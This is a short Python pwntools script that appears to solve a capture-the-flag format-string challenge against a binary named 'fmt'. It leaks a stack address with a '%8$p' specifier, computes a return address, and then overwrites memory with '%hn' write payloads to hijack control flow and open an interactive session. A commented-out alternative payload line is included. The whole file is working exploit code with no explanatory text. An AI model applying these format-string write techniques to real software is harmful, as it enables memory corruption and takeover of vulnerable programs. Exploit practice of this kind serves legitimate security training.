from pwn import*
elf=ELF("./fmt")
context.log_level="debug"
context.terminal=['tmux','split-window','-h']

local=1
if local:
    p=process("./fmt")
#    pause()
#    gdb.attach(p)
else:
    p=remote()
    libc=ELF()

ret_addr=0
point=0

def leakaddr():
    global ret_addr,point
    p.sendlineafter("Welcome","%8$p")
    p.recvuntil("0x") 
    stack_addr=int(p.recv(12),16)
    ret_addr=stack_addr - 8
    point=stack_addr+0xe8
    log.success("ret_addr:" + hex(ret_addr))
    log.success("point:" + hex(point))
    p.sendlineafter("(yes/no)","yes")


leakaddr()
val=(point-0xf0)&0xffff
log.success(hex(val))
#pause(10)
p.sendline("%{}c%15$hn".format(val))
p.sendlineafter("(yes/no)","yes")     

#shell=elf.symbols["shell"]&0xffff
#log.success("shell:"+hex(shell))
#pause(10)
p.sendline("%2697c%41$hn")
p.sendlineafter("(yes/no)","yes") 

p.interactive()

#%16c%18$n%239c%19$hhnaaa











